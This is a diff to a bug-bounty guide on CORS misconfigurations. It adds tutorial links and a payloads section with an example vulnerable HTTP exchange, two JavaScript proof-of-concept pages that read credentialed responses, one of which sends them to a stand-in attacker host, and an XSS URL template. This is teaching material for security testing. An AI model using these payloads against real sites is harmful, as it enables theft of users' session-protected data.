@@ -1,5 +1,9 @@
 # Cross Origin Resource Sharing
 
+- [Explaination](#introduction)
+- [Tutorials](#tutorials-for-cross-origin-resource-sharing)
+- [Payloads](#payloads-for-cross-origin-resource-sharing)
+
 # Introduction:
 Bug bounty hunting has become a popular practice for identifying and reporting security vulnerabilities in web applications. One common area that bug hunters often encounter is Cross-Origin Resource Sharing (CORS) misconfigurations. In this article, we will delve into the world of CORS and explore its significance in bug bounty hunting.
 
@@ -35,5 +39,72 @@ When you discover a CORS misconfiguration, it is essential to report it responsi
 Cross-Origin Resource Sharing (CORS) misconfigurations pose significant security risks to web applications. As a bug bounty hunter, having a solid understanding of CORS and its potential vulnerabilities is crucial. By employing various techniques and exploiting misconfigurations, you can uncover critical security flaws, help organizations enhance their security posture, and contribute to a safer web environment. Happy hunting!
 
 ### Tutorials for Cross Origin Resource Sharing
+* [What is CORS?](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) - A good tutorial for CORS by Portswigger
+* [Cross Origin Resource Sharing](https://www.geeksforgeeks.org/cross-origin-resource-sharing-cors/) - A tutorial on GeeksforGeeks
+* [Think Outside the Scope: Advanced CORS Exploitation Techniques](https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397) - A great article on CORS
+* [CORS Misconfigurations Explained](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/) - Another great article to read
 
 ### Payloads for Cross Origin Resource Sharing
+
+**Vulnerable Implementation**
+```
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: https://evil.com
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+
+```
+
+**Proof of Concept**
+```
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
+
+```
+alternative
+
+```
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://victim.example.com/endpoint", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
+
+```
+
+**Vulnerable Example: XSS on Trusted Origin**
+
+```
+https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
+
+```
